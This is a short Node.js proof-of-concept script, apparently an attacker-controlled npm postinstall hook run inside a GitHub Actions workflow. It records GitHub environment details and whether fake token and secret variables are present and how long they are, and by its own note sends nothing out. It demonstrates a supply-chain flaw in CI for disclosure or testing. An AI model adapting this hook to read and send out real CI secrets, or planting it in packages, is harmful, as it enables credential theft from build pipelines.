import { mkdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";

const outputDir = process.env.POC_OUTPUT_DIR || join(process.cwd(), "poc-output");
mkdirSync(outputDir, { recursive: true });

const proof = {
  message: "Attacker-controlled postinstall executed.",
  eventName: process.env.GITHUB_EVENT_NAME || "",
  repository: process.env.GITHUB_REPOSITORY || "",
  ref: process.env.GITHUB_REF || "",
  sha: process.env.GITHUB_SHA || "",
  eventPath: process.env.GITHUB_EVENT_PATH || "",
  fakeGithubTokenPresent: Boolean(process.env.FAKE_GITHUB_TOKEN),
  fakeGithubTokenLength: process.env.FAKE_GITHUB_TOKEN?.length || 0,
  fakeRepoSecretPresent: Boolean(process.env.FAKE_REPO_SECRET),
  fakeRepoSecretLength: process.env.FAKE_REPO_SECRET?.length || 0,
  note: "The POC does not print or exfiltrate secret values. It only records presence and length."
};

writeFileSync(join(outputDir, "attacker-code-ran.json"), `${JSON.stringify(proof, null, 2)}\n`);

console.log("[attacker postinstall] executed");
console.log(`[attacker postinstall] event=${proof.eventName}`);
console.log(`[attacker postinstall] fake token present=${proof.fakeGithubTokenPresent}`);
console.log(`[attacker postinstall] fake repo secret present=${proof.fakeRepoSecretPresent}`);
console.log(`[attacker postinstall] proof=${join(outputDir, "attacker-code-ran.json")}`);

